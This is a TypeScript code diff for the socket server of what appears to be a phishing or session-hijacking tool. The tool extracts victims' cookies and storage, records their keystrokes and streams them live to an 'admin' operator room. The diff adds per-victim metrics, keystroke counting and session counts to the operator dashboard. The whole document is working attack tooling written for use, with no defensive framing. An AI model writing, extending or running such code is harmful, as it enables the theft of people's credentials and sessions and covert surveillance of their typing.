@@ -24,6 +24,14 @@ import {
 } from './input-handler.js';
 import { extractCookies, extractStorage } from './session-extractor.js';
 import { logEvent } from './session-logger.js';
+import {
+  getSystemMetrics,
+  getVictimMetrics,
+  recordKeystroke,
+  clearVictimMetrics,
+  incrementSessionCount,
+} from './metrics.js';
+import { MAX_CONCURRENT_VICTIMS } from './browser-manager.js';
 
 type IoServer = Server<ClientToServerEvents, ServerToClientEvents, Record<string, never>, SocketData>;
 
@@ -50,6 +58,28 @@ function handleAdminConnect(
 ): void {
   // Join admin room for thumbnail broadcasts
   void socket.join('admin');
+
+  // Start metrics emission interval (every 2 seconds)
+  const metricsInterval = setInterval(() => {
+    const instances = getAllInstances();
+    
+    // Emit system metrics
+    const systemMetrics = getSystemMetrics(instances, MAX_CONCURRENT_VICTIMS);
+    socket.emit('system_metrics', systemMetrics);
+    
+    // Emit per-victim metrics for all active victims
+    instances
+      .filter(i => i.claimed && i.victimSocket !== null)
+      .forEach(instance => {
+        const victimMetrics = getVictimMetrics(instance);
+        socket.emit('victim_metrics', victimMetrics);
+      });
+  }, 2000);
+
+  // Clear interval on disconnect
+  socket.on('disconnect', () => {
+    clearInterval(metricsInterval);
+  });
 
   // Send current victim list
   const victims: VictimInfo[] = getAllInstances()
@@ -250,6 +280,9 @@ function handleVictimConnect(
 
       socket.data.browserId = instance.id;
 
+      // Increment session counter
+      incrementSessionCount();
+
       void logEvent({
         event: 'session_start',
         browserId: instance.id,
@@ -329,6 +362,7 @@ function handleVictimConnect(
     const entry = formatKey(data.key);
     if (entry) {
       instance.keylog += entry;
+      recordKeystroke(instance.id);
       io.to('admin').emit('keylog', { browserId: instance.id, entry });
       void logEvent({ event: 'keylog', browserId: instance.id, entry });
     }
@@ -393,6 +427,7 @@ async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> 
       : 0;
     void logEvent({ event: 'session_end', browserId, durationMs });
     io.to('admin').emit('victim_disconnected', { browserId });
+    clearVictimMetrics(browserId);
     await closeBrowser(browserId);
   }
 }
